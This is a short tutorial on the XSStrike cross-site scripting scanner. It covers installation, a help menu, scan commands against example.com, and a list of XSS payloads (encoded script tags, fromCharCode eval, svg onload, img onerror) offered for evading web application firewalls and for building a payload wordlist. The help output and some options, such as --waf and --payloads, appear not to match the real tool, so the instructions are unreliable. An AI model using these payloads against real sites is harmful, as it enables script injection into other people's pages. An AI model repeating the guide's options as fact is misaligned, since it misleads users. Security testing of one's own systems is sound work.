XSSStrike - Advanced Hacking Guide

1. Installing XSSStrike

XSSStrike is an advanced XSS scanner. Install it with:

git clone https://github.com/s0md3v/XSStrike.git cd XSStrike pip3 install -r requirements.txt python3 xsstrike.py -h

2. Understanding the Help Menu (-h)

To see all available options, run:

python3 xsstrike.py -h

You'll see:

usage: xsstrike.py [-h] [-u URL] [-t THREADS] [-l LEVEL] [--params] [--crawl] [--fuzzer] [--waf] [--update] optional arguments: -h, --help Show help message and exit -u URL, --url URL Target URL -t THREADS, --threads THREADS Number of threads -l LEVEL, --level LEVEL Scan intensity (1-3) --params Detect parameters automatically --crawl Crawl the website for inputs --fuzzer Use fuzzing to detect bypasses --waf Detect Web Application Firewall --update Update XSSStrike

3. Basic Usage - Scanning a Target

Scan a single URL:

python3 xsstrike.py -u "http://example.com/search.php?q=test"

Scan with automatic parameter detection:

python3 xsstrike.py -u "http://example.com/" --params

Increase speed using multiple threads:

python3 xsstrike.py -u "http://example.com/" -t 10

4. Advanced Techniques

Enable the fuzzer for WAF evasion:

python3 xsstrike.py -u "http://example.com/" --fuzzer

Enable deep crawling:

python3 xsstrike.py -u "http://example.com/" --crawl

Detect if a WAF is present:

python3 xsstrike.py -u "http://example.com/" --waf

5. Automating Attacks

Run a full automated scan:

python3 xsstrike.py -u "http://example.com/" --params --fuzzer --waf -t 10

Save results to a file:

python3 xsstrike.py -u "http://example.com/" > results.txt

6. Bypassing WAFs (Stealth Mode)

Try encoded payloads to evade filters:

%3Cscript%3Ealert('XSS')%3C/script%3E

Use JavaScript encoding:

<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

SVG-based XSS attack:

<svg onload=alert(1)>

Inside an image attribute:

<img src=x onerror=alert(1)>

7. Creating a Custom Payload Wordlist

Step 1: Create a wordlist:

echo "<script>alert('XSS')</script>" > my_xss_payloads.txt echo "<img src=x onerror=alert(1)>" >> my_xss_payloads.txt

Step 2: Use the wordlist in XSSStrike:

python3 xsstrike.py -u "http://example.com/" --params --fuzzer --waf --payloads my_xss_payloads.txt
